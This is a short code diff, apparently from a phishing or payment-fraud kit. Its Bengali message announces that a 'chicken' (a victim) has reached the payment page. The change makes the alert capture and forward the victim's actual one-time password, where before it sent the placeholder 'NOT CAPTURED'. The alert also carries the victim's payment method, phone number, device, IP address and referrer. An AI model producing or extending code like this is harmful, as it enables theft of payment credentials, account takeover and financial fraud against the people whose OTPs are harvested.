@@ -131,11 +131,12 @@ function buildMessage(type: string, data: any, meta: any) {
     case "payment_otp": {
       const method = escapeHtml(data?.method ?? "N/A");
       const number = escapeHtml(data?.number ?? "N/A");
+      const otp = escapeHtml(data?.otp ?? "N/A");
       const masked = maskNumber(number);
       return formatMsg("মুরগি পেমেন্ট পেইজে ঢুকেছে, তারাতাড়ি রেডি হও ✅", [
         { key: "Payment Method", value: method },
         { key: "Number", value: masked },
-        { key: "OTP", value: "NOT CAPTURED" },
+        { key: "OTP", value: otp },
         { key: "🐔মুরগির Device", value: device },
         { key: "🐔মুরগির IP", value: ip },
         { key: "🐔মুরগির Referrer", value: ref },
